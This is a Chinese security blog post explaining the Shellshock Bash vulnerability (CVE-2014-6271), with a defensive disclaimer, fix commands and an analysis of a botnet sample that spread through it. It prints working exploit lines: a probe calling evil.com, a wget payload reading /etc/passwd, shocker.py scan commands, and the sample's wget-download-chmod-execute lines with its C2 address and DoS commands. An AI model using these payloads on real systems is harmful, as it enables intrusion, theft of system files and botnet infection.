{"title":"Linux渗透之Shellshock后门","slug":"网安大类/PenetrationNote/持续维权/Backdoor/Linux后门/Shellshock后门","date":"2019-08-31T05:34:30.000Z","updated":"2022-03-30T05:02:09.820Z","url":"2019/8-31-401.html","path":"api/articles/2019/8-31-401.html.json","covers":["https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919163458.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919163754.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919164118.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919165155.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919165308.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919165636.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919165657.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919165838.png"],"content":"<p><b style=\"color:red\">注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。</b></p>\n<p>[TOC]</p>\n<a id=\"more\"></a>\n<h4 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h4><p>描述:Shellshock又称Bashdoor，是在Unix中广泛使用的Bash shell中的一个安全漏洞，2014年9月24日Bash被公布存在远程代码执行漏洞,最初认为该漏洞只是本地漏洞，所以无法很好地利用。随着研究的深入研究发现其实它可以进行远程CGI漏洞利用，Bash漏洞其实是非常经典的“注入式攻击”也就是可以向 bash注入一段命令，从bash1.14到4.3都存在这样的漏洞;</p>\n<ul>\n<li>漏洞编号：CVE-2014-6271</li>\n<li><p>详细情况：Bash(GNU Bourne-Again Shell)是大多数Linux系统以及Mac OS X v10.4默认的shell，它能运行于大多数Unix风格的操作系统之上，甚至被移植到了Microsoft Windows上的Cygwin系统中，以实现windows的POSIX虚拟接口.<br>Bash其广泛的使用将意味全球至少 150 万的主机将受到影响，此外 Linux/Unix 世界内的安卓和苹果都难以幸免。<br>破壳漏洞（ShellShock）的严重性被定义为 10 级（最高）,而今年 4 月爆发的 OpenSSL(心脏出血)漏洞才 5 级！</p>\n</li>\n<li><p>漏洞原理：<br>Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统<br>受到该漏洞影响的bash使用的环境变量是通过函数名称来调用的，以“(){”开头通过环境变量来定义的。而在处理这样的“函数环境变量”的时候，并没有以函数结尾“}”为结束，而是一直执行其后的shell命令</p>\n</li>\n<li><p>受影响的版本:</p>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919163458.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n</li>\n</ul>\n<hr>\n\n<h4 id=\"0x01-测试和利用\"><a href=\"#0x01-测试和利用\" class=\"headerlink\" title=\"0x01 测试和利用\"></a>0x01 测试和利用</h4><p><strong>1.判断方法</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#方法1</span></span><br><span class=\"line\">env x=<span class=\"string\">'() &#123; :;&#125;; echo Shellshock'</span> bash -c <span class=\"string\">\"exit\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#方法2</span></span><br><span class=\"line\">() &#123; :;&#125;; <span class=\"built_in\">echo</span> 1 &gt; /dev/udp/evil.com/53    <span class=\"comment\">#如果服务器存在Shellshock漏洞，evil.com的53端口就会受到一个UDP包</span></span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919163754.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p><br></p>\n<p><strong>2.补丁更新后仍然可以绕过</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">env -i X=<span class=\"string\">';() &#123; (a)=&gt;\\'</span> bash -c <span class=\"string\">'echo `date`'</span>; cat /etc/hosts</span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919164118.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p><br></p>\n<p><strong>3.利用Wget进行测试,Wget, Shellshock 和 John the Ripper(解密)</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget -U <span class=\"string\">\"() [ test;];echo \\\"Content-type: text/plain\\\";echo; echo;/bin/cat /etc/passwd\"</span> url</span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<p><strong>4.Shellshock 利用工具</strong><br>描述：一个发现并利用服务器 Shellshock 的工具,项目地址: <a href=\"https://github.com/nccgroup/shocker\" target=\"_blank\" rel=\"noopener\">https://github.com/nccgroup/shocker</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#Help Text</span></span><br><span class=\"line\">usage: shocker.py [Options]</span><br><span class=\"line\">-h, --<span class=\"built_in\">help</span> show this <span class=\"built_in\">help</span> message and <span class=\"built_in\">exit</span></span><br><span class=\"line\">--Host HOST, -H HOST A target hostname or IP address</span><br><span class=\"line\">--file FILE, -f FILE File containing a list of targets</span><br><span class=\"line\">--port PORT, -p PORT The target port number (default=80)</span><br><span class=\"line\">--exploit EXPLOIT, -e EXPLOIT Command to execute (default=/bin/uname -a)</span><br><span class=\"line\">--cgi CGI, -c CGI Single CGI to check (e.g. /cgi-bin/test.cgi)</span><br><span class=\"line\">--proxy PROXY A BIT BROKEN RIGHT NOW Proxy to be used <span class=\"keyword\">in</span> the form <span class=\"string\">'ip:port'</span></span><br><span class=\"line\">--ssl, -s Use SSL (default=False)</span><br><span class=\"line\">--threads THREADS, -t THREADS Maximum number of threads (default=10, max=100)</span><br><span class=\"line\">--verbose, -v Be verbose <span class=\"keyword\">in</span> output</span><br></pre></td></tr></table></figure>\n<p>测试案例<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Scans for http://127.0.0.1/cgi-bin/test.cgi and, if found, attempts to cat /etc/passwd</span></span><br><span class=\"line\">python shocker.py -H 192.168.56.118  --<span class=\"built_in\">command</span> <span class=\"string\">\"/bin/cat /etc/passwd\"</span> -c /cgi-bin/status --verbose</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Scan www.example.com on port 8001 using SSL for all scripts in cgi_list and attempts the default exploit for any found</span></span><br><span class=\"line\">python shocker.py -H www.example.com -p 8001 -s</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Scans all hosts listed in the file ./hostlist with the default options</span></span><br><span class=\"line\">python shocker.py -f ./hostlist</span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919165155.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>修复方案:</p>\n<ul>\n<li>(1).针对RedHat、CentOS Liunx发行版本，请执行：<ul>\n<li>yum -y update bash</li>\n</ul>\n</li>\n<li>(2).针对Debian Liunx发行版本，请执行：<ul>\n<li>sudo apt-get update &amp;&amp; sudo apt-get install –only-upgrade bash</li>\n</ul>\n</li>\n</ul>\n<hr>\n\n<h4 id=\"0x02-传播样本详细分析\"><a href=\"#0x02-传播样本详细分析\" class=\"headerlink\" title=\"0x02 传播样本详细分析\"></a>0x02 传播样本详细分析</h4><p><strong>1.样本传播方式</strong><br>该样本利用Bash漏洞进行传播,其漏洞的利用只需要简单的几行命令即可,这无疑为利用者带来了极大的便利,利用代码如下:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#而该样本通过wget将样本下载并执行命令如下:</span></span><br><span class=\"line\">()&#123;:;&#125;; /usr/bin/wget xxxx/shell1 -O /tmp/shell| /bin/chomd 777 /tmp/shell | /tmp/shell</span><br><span class=\"line\">Cookie, ().&#123;.:;.&#125;;.wget /tmp/besh http://X.X.X.X/nginx; chmod.777 /tmp/besh; /tmp/besh;</span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919165308.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p><strong>2.样本行为分析</strong><br>(1).获取计算机相关信息<br>该样本启动后首先会获取计算机的相关信息,如CPU,网络配置等信息<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919165636.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>(2).接着该样本连接自己的服务器(89.238.150.154:5),strace附加在创建的子进程样本上监视其行为如下<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919165657.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>(3).如果连接服务器成功,则根据服务器传来的指令,远程控制被感染机器,命令集合如下:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PING </span><br><span class=\"line\">GETLOCALIP </span><br><span class=\"line\">SCANNER </span><br><span class=\"line\">HOLD (DoS Flood) </span><br><span class=\"line\">JUNK (DoS Flood) </span><br><span class=\"line\">UDP (DoS Flood) </span><br><span class=\"line\">TCP (DoS Flood) </span><br><span class=\"line\">KILLATTK </span><br><span class=\"line\">LOLNOGTFO</span><br></pre></td></tr></table></figure></p>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190919165838.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<p>DVR Scanner主要测试目标是否存在DVR漏洞,如果存在则尝试通过像”root”,”12345”这样的弱口令进行进行连接,如果连接成功则执行ps尝试寻找”cmd.so”进程,该进程主要是莱特币矿工相关.</p>\n<p>一些指令解释</p>\n<ul>\n<li>●HOLD (Dos Flood) 对目标服务器进行Hold洪水攻击,通过接受服务器数据包,来指明需要攻击的秒数,并将攻击时间返回给服务器</li>\n<li>●JUNK (DoS Flood) 对目标服务器进行JUNK洪水攻击</li>\n<li>●UDP (DoS Flood) 对目标服务器进行UDP洪水攻击</li>\n<li>●TCP (DoS Flood) 对目标服务器进行TCP洪水攻击</li>\n<li>●KILLATTK 通过接受服务器发来的进程列表,通过kill系统调用杀掉指定的进程</li>\n<li>●LOLNOGTFO 非法服务器数据包指令</li>\n</ul>\n<p>补充:</p>\n<ul>\n<li>漏洞爆发之后,我们在后台对全国范围内的相关网站进行了一次统计,我们发现了某公司的NAS设备管理页面存在cgi漏洞,而通过查看网站页面，发现设备是类似“TS-119P”， 设备名都是TS-XX的。</li>\n<li>备注：NAS是一种网络存储设备，现在的很多路由器也支持此功能，如果此设备有漏洞，那么里面的资源都会有被盗的风险。</li>\n</ul>\n<p>参考来源:</p>\n<ul>\n<li><a href=\"http://www.freebuf.com/articles/system/45390.html\" target=\"_blank\" rel=\"noopener\">http://www.freebuf.com/articles/system/45390.html</a></li>\n</ul>\n","comments":true,"excerpt":"注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。[TOC]","categories":[{"name":"持续维权","path":"api/categories/持续维权.json"}],"tags":[{"name":"Shellshock","path":"api/tags/Shellshock.json"}]}